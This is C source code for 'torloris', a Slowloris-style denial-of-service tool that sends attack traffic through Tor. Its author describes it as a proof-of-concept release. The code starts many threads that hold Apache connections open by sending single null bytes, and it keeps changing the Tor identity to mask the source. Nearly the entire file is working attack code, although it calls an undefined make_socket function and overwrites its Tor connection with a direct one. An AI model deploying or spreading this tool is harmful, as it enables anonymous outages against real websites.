/* =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 *                  Slowloris with a twist over tor
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * Due to the alpha version of this code being leaked I've decided
 * to release an improved version to fully show this method of
 * attack mostly free of the bugs / dependency on torsocks. This
 * attack works on a similar idea of slowloris only it sends packets
 * containing a single 0x00 and optionally nothing causing Apache
 * to keep the connection alive almost indefinitely.
 * Due to no one knowing how th3j35t3r's XerXes works I can not say
 * if this is the same method. This was one of my many ideas I was
 * exploring as to how it could possibly work that has some successful
 * results.
 * - SanguineRose / William Welna
 *        http://seclists.org/fulldisclosure/2011/Jul/84 // leaked version of code
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

/* Re-connecting to tor sometimes takes a while, in order for this to be effective it requires
 * mass amounts of threads handling only a few connections each, since this is a POC I will leave
 * it up to others to fix that. It also has limited success/attack lengths due to tor being slow
 */
#define CONNECTIONS 40
#define THREADS 60

typedef struct {
const char *host, *port;
} thread_args;


void tlbroke(int s) { // is needed leave this for sigpipe
}



void dump_array(char *name, char *data, int size) { // debug
	int x, z, indent = strlen(name) + 2;
	fprintf(stderr, "%s { ", name);
	for(x=0; x < size; x++) {
	for(z=0; z < indent; z++)
	putc(0x20, stderr);
	fprintf(stderr, "%20x\n", data[x]);
	}
	fprintf(stderr, "};\n");
}

// SOCKS5 SUPPORT!
 
int pr0f_loves_me_tor_connect(const char *host, const char *port) {
	char *buf = calloc(1024, sizeof(char));
	short l = strlen(host), t;
	int x, sock;
	fprintf(stderr, "Connect %s:%s\n", host, port);
	if((sock=make_socket("127.0.0.1", "9050"))<0) {
	free(buf);
	return sock;
	}
	write(sock, "\x05\x01\x00", 3);
	read(sock, buf, 1024);
	if((buf[0] != 0x05) || (buf[1] == 0xFF) || (buf[1] != 0x00)) {
	free(buf);
	return -3;
	}
	buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00; buf[3] = 0x03; buf[4] = l;
	for(x=0; x < l; x++)
	buf[5+x] = host[x];
	x=l+5;
	t = htons(atoi(port));
	memcpy((buf+x), &t, 2);
	write(sock, buf, x+2);// send request
	read(sock, buf, 1024);
	if((buf[0] == 0x05) && (buf[1] == 0x00)) {
	free(buf);
	return sock;
	}
	free(buf);
	return -4;
}


void do_help(char *n) {
	fprintf(stderr, "Usage: <IP/Hostname> <Port>\n");
	exit(0);
}

void *tlcycle_identity() {
        int sock = make_socket("localhost", "9051");
        char *shit_bucket = calloc(1024, sizeof(char));
        if(sock < 0) {
        fprintf(stderr, "[-] Can't connect to tor control port\n");
        free(shit_bucket);
        pthread_exit(NULL);
        }
        write(sock, "AUTHENTICATE \"\"\n", 16);
        while(1) {
        write(sock, "signal NEWNYM\n", 15);
        fprintf(stderr, "[cycle_identity -> signal NEWNYM\n");
        read(sock, shit_bucket, 1024);
        sleep(5);
        }
}

void *tlattack(void *arg) {
        thread_args *a = (thread_args *)arg;
        int x, r, socks[CONNECTIONS];
        fprintf(stderr, "[!] Thread Started ..\n");
        for(x=0; x < CONNECTIONS; x++)
        socks[x]=0;
        signal(SIGPIPE, &tlbroke);
        while(1) {
        for(x=0; x < CONNECTIONS; x++) {
        if(socks[x] <= 0) {
// Socks used here...
        socks[x] = pr0f_loves_me_tor_connect(a->host, a->port);
        socks[x] = make_socket(a->host, a->port);
        fprintf(stderr, "[!] Socket Returned %i\n", socks[x]);
        }
        if(write(socks[x], "\0", 1) < 0) {
        close(socks[x]);
        fprintf(stderr, "[-] Socket Error Returned %i\n", socks[x]);
        //socks[x] = pr0f_loves_me_tor_connect(a->host, a->port);
        }
        }
        usleep(100000);
        }
}



int torloris_main(int argc, char **argv) {
	pthread_t threads[THREADS];
	pthread_t cycle_tid;
	thread_args arg;
	void *status;
	int x;
	if(argc != 3)
	do_help(argv[0]);
	arg.host = (const char *)argv[1];
	arg.port = (const char *)argv[2];
	pthread_create(&cycle_tid, NULL, tlcycle_identity, NULL);
	for(x=0; x < THREADS; x++) {
	pthread_create(&threads[x], NULL, tlattack, &arg);
	usleep(200000);
	}
	for(x=0; x < THREADS; x++)
	pthread_join(threads[x], &status);
	pthread_kill(cycle_tid, 15);
	pthread_exit(NULL);
	return 0;
}
